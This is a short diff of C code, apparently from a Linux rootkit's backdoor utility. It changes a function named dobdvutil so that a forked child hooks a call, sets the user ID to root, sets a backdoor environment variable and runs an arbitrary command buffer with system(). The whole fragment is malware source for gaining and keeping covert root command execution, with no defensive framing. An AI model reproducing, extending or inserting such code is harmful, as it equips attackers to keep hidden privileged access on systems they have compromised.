@@ -121,10 +121,20 @@ void dobdvutil(char *const argv[]){
             printf("Press enter to confirm.");
             getchar();
 
-            chdir("/");
-            unhide_self();
-            system("id");
-            system(argbuf);
+            pid_t pid = fork();
+            if(pid > 0){
+                wait(NULL);
+            }
+            if(pid == 0){
+                hook(CSETGID);
+                setuid(0);
+                call(CSETGID, 0);
+                putenv(BD_VAR"=1");
+                chdir("/");
+                system("id");
+                system(argbuf);
+                wait(NULL);
+            }
             exit(0);
         }
     }
